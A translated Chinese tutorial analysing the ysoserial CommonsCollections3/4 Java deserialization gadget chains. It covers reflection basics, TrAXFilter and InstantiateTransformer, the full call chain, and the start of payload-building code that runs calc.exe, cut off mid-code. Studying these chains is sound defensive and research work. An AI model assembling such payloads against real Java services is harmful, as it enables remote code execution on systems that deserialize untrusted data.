# ysoserial CommonsCollections3/4 详细分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
ysoserial 工具的CC3和CC4链是CC1和CC2
链的扩展链，触发过程与前两个链大致相同，主要是命令执行部分有所变化。借着这两个链的学习，巩固下前面两个链的构造和利用思路。
## 0x01 前置知识
###  0x1 反射执行构造函数
假设有一个有参构造和无参构造方法的Person类
    public class Person {
        private String name;
        public  Person(){
        }
        public  Person(String name){
            this.name = name;
        }
        public static void main(String[] args) {
        }
    }
**1\. 无参构造函数**
Class.newInstance()
    Person p = new Person();
    Person p = Person.class.newInstance();
利用getMethod和invoke方法调用
    Class person = Person.class;
    Class personClass = person.getClass();
    Method method = personClass.getMethod("newInstance",new Class[]{});
    Person c = (Person) method.invoke(person,
        new Object[]{});
**2\. 有参构造函数**
Constructor.newInstance()
    Person p = new Person();
    Constructor cons = Person.class.getConstructor(String.class);
    Person p = cons.newInstance("xxx");
利用getMethod和invoke方法调用
    Class person = Person.class;
    Class personClass = person.getClass();
    Method method = personClass.getMethod("getConstructor",new Class[]{Class[].class});
    Constructor c = (Constructor) method.invoke(person,new Object[]{new Class[]{String.class}});
    Class cons = c.getClass();
    Method method1 = cons.getMethod("newInstance", new Class[]{Object[].class});
    Person p = (Person) method1.invoke(c,new Object[]{new Object[]{"xxx"}});
    System.out.println(p.GetName());
###  0x2 利用反射修改变量
反射的好处是即使是私有变量，也可以通过反射获取并修改，方法如下：
    Person p = new Person("xxx");
    Field com = p.getClass().getDeclaredField("name");
    com.setAccessible(true);
    com.set(p,"tom");
    System.out.println(p.GetName());
需要设这变量的访问权限，把权限改成public，调用set 方法修改其内容
## 0x02 CommonsCollections3 分析
在分析过前两个链之后，CC3就显得没那么困难了，主要引入了TrAXFilter这个类在初始化的时候调用了newTransformer方法，从而触发加载构造好的字节码，完成命令执行。一些前置知识在
 文章中已经提到，打算从命令执行链和调用链构造这两个方面进行分析。
###  0x1 命令执行链分析
该链针对的版本是 `commons-collections:3.1`
，命令执行部分改造的CC2的利用方式。CC2链是利用`InvokerTransformer`
类调用的`templates`中的`newTransformer`方法。而作者构造的CC3链采用了`TrAXFilter`这个新的类，但我们也可以用之前CC2链中的命令执行方法。下面分析下这两个利用
**1\. 延续CC2命令执行**
`InvokerTransformer` 类可以调用任意对象的任意方法，这个天然的利用条件在 `commons-collections:4.4`
中被修补。所以目前还是只能在3版本运行
    final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(templatesImpl),
    new InvokerTransformer("newTransformer", new Class[0], new Object[0])
    };
在调用 `InvokerTransformer` 类执行 `newTransformer`
方法的时候不需要再将其伪装成其他的函数，因为它本身在反序列化之前是没有被调用过的，这点不像Queue会在对象添加的时候触发比较器类。
因为`templatesImpl` 实现了Serializable接口，因此可以通过对象的形式存在，最后将会被反序列化成二进制存储格式。
**2\. 利用TrAXFilter触发命令执行**
`InvokerTransformer` 类可以调用 `newTransformer`
方法，那么是否存在一个类可以直接调用这个方法呢？作者就在CC3链中展示这个类。
`TrAXFilter` 的构造方法中存在这样的代码，会调用参数中传递过来的对象的`newTransformer`
方法，如果我们把`templates`当做该类的构造参数，那么就能完成利用
* * *
这时还存在着一个问题，没有形成完整的命令执行链，怎样才能触发`TrAXFilter`的构造方法呢？这里有两种方式触发
**方法一**
因为是在`commons-collections:3.1`中的利用，所以可以继续时候用`InvokerTransformer` 类进行构造
    final Transformer[] transformers = new Transformer[] {    
    new ConstantTransformer(TrAXFilter.class),
    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{Templates.class}}),
    new InvokerTransformer("newInstance", new Class[] {Object[].class }, new Object[] {new Object[]{templatesImpl}),};
需要明确的是 getConstructor 的参数类型，要通过getMethod方法获取该方法对象
`Class... parameterTypes` 为Class数组
getMethod 在调用的时候第二个参数可以是单个元素也可是数组元素，InvokerTransformer方法默认采用了第二种方式。
所以在构造的时候 `new Class[]{}`和`new Object[]{}`
都是必须要带的，而里面的内容才是要生产方法对象的真正参数。`Class[].class` 就是Class数组类型， `Object[].class`
是Object数组类型。
**方法二**
该方法引入了新的类，`InstantiateTransformer` 也是 同时实现`Transformer`和`Serialzable`
的类，用它的目的是`transform`函数会调用`getConstructor` 方法和执行`newInstance`函数创建实例
通过该transform方法就可实现方法一中的一大堆操作，最后可以简化为以下代码
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(
            new Class[] { Templates.class },
            new Object[] { templatesImpl }
            )
    };
简答描述为 `InstantiateTransformer` 在 `transform`函数调用时会通过反射执行其传递的参数class类的有参构造函数。
###  0x2 反序列化链分析
整个链的分析可以参考 
完整调用链如下
    /*
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InstantiateTransformer.transform()
                                   TrAXFilter.TrAXFilter()
                                   ...
                                   exec()
    Requires:
        commons-collections
     */
采用CC1中的调用关系图，修改了命令执行部分
###  0x3 Payload构造
在第二小节已经把命令执行部分的三种方式通过代码实现了。`Payload`构造部分只需要将之前的代码调用链拼接在一起就可以了。
     public static void main(String[] args) throws Exception{
            final Object templates = createTemplatesImpl("calc.exe");
            final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                    new Class[] { Templates.class },
                    new Object[] { templates }
                )